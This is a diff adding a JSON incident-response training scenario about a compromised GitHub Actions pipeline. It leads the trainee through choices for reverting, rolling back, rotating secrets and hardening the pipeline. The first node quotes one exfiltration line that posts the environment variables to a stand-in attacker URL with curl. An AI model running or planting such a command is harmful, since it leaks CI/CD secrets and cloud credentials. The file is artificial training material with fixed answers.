@@ -1,0 +1,154 @@
+{
+  "title": "compromised_cicd",
+  "description": "An attacker gains write access to a GitHub Actions workflow, injecting malicious steps that exfiltrate repository secrets and deploy backdoored builds to production.",
+  "timeline": [
+    {
+      "index": 0,
+      "title": "Suspicious Workflow Commit",
+      "description": "A commit modifying the production deployment workflow is detected from an unusual account with write access. The change adds a curl command to an external server.",
+      "timeOffsetSec": 5
+    },
+    {
+      "index": 1,
+      "title": "Secrets Exfiltration Detected",
+      "description": "GitHub Advanced Security alerts on a workflow step that echoes CI/CD secrets to an external endpoint. The workflow has already run twice.",
+      "timeOffsetSec": 20
+    },
+    {
+      "index": 2,
+      "title": "Backdoored Build Deployed",
+      "description": "The malicious workflow deployed a backdoored container image to production. The image contains a reverse shell payload activated by a specific HTTP header.",
+      "timeOffsetSec": 60
+    },
+    {
+      "index": 3,
+      "title": "Production Deployment Halted",
+      "description": "All deployments frozen. Compromised workflow reverted. Production containers rolled back to last known-good image.",
+      "timeOffsetSec": 120
+    },
+    {
+      "index": 4,
+      "title": "Secrets Rotated",
+      "description": "All CI/CD secrets, deployment keys, and cloud credentials exposed in the workflow run logs rotated. Compromised account access revoked.",
+      "timeOffsetSec": 180
+    },
+    {
+      "index": 5,
+      "title": "Pipeline Hardened",
+      "description": "Workflow approval gates implemented. OIDC-based secretless cloud authentication deployed. Branch protection rules enforced on workflow files.",
+      "timeOffsetSec": 300
+    }
+  ],
+  "root": "node-1",
+  "nodes": {
+    "node-1": {
+      "title": "Malicious Workflow Modification Detected",
+      "situation": "A commit from an unusual GitHub account adds a curl command to your production deployment workflow: curl -d \"$(env)\" https://attacker.com/collect. The workflow has already executed twice, likely exfiltrating CI/CD secrets including cloud deployment credentials and registry tokens.",
+      "question": "What is your immediate action?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Immediately revert the malicious workflow commit, freeze all CI/CD deployments, and rotate all secrets that were available to the workflow environment.",
+          "outcome": {
+            "type": "node",
+            "target": "node-2"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Disable the specific workflow file and continue other deployments while investigating.",
+          "outcome": {
+            "type": "failure"
+          }
+        },
+        {
+          "label": "C",
+          "text": "Monitor the next workflow run to confirm the exfiltration before taking action.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-2": {
+      "title": "Backdoored Container Image in Production",
+      "situation": "Analysis of the workflow runs reveals a backdoored container image was successfully deployed to production. The image contains a reverse shell activated by a specific HTTP header. Production traffic may have triggered it.",
+      "question": "How do you respond to the backdoored production deployment?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Immediately roll back production to the last known-good container image, isolate potentially activated containers for forensic analysis, and scan all container images in the registry for tampering.",
+          "outcome": {
+            "type": "node",
+            "target": "node-3"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Patch the backdoor in place by deploying an updated image with the malicious code removed without rolling back first.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-3": {
+      "title": "Compromised Account Access",
+      "situation": "Investigation reveals the attacker gained write access via a compromised developer account that had branch write permissions without requiring code review. You must revoke the attacker's access and determine how the account was compromised.",
+      "question": "How do you address the compromised developer account?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Revoke the compromised account's repository access, force a password and MFA reset, audit all changes made by the account, and review GitHub audit logs to determine how credentials were obtained.",
+          "outcome": {
+            "type": "node",
+            "target": "node-4"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Remove the account's write access to the workflow files only and allow the account to continue with read access while the investigation continues.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-4": {
+      "title": "Harden the CI/CD Pipeline",
+      "situation": "The attack succeeded because workflow files had no approval requirement and secrets were injected as environment variables accessible to all workflow steps. Structural changes to the pipeline are needed.",
+      "question": "What CI/CD security controls do you implement?",
+      "options": [
+        {
+          "label": "A",
+          "text": "Implement required reviewers for workflow file changes, deploy OIDC-based secretless cloud authentication (replacing long-lived credentials), and use step-level secret scoping to limit secret exposure.",
+          "outcome": {
+            "type": "node",
+            "target": "node-5"
+          }
+        },
+        {
+          "label": "B",
+          "text": "Rotate all secrets on a monthly schedule and rely on secret scanning alerts without changing the workflow approval process.",
+          "outcome": {
+            "type": "failure"
+          }
+        }
+      ]
+    },
+    "node-5": {
+      "title": "Scenario Complete",
+      "situation": "The compromised CI/CD pipeline was contained. The backdoored deployment was rolled back, secrets were rotated, the attacker's access was revoked, and required reviewers for workflow changes plus OIDC authentication now protect the pipeline from future injection attacks.",
+      "question": "Scenario complete. Well done!",
+      "options": []
+    }
+  },
+  "category": "Cloud",
+  "difficulty": "Advanced",
+  "tags": [
+    "CI/CD",
+    "GitHub Actions",
+    "supply chain",
+    "cloud"
+  ]
+}
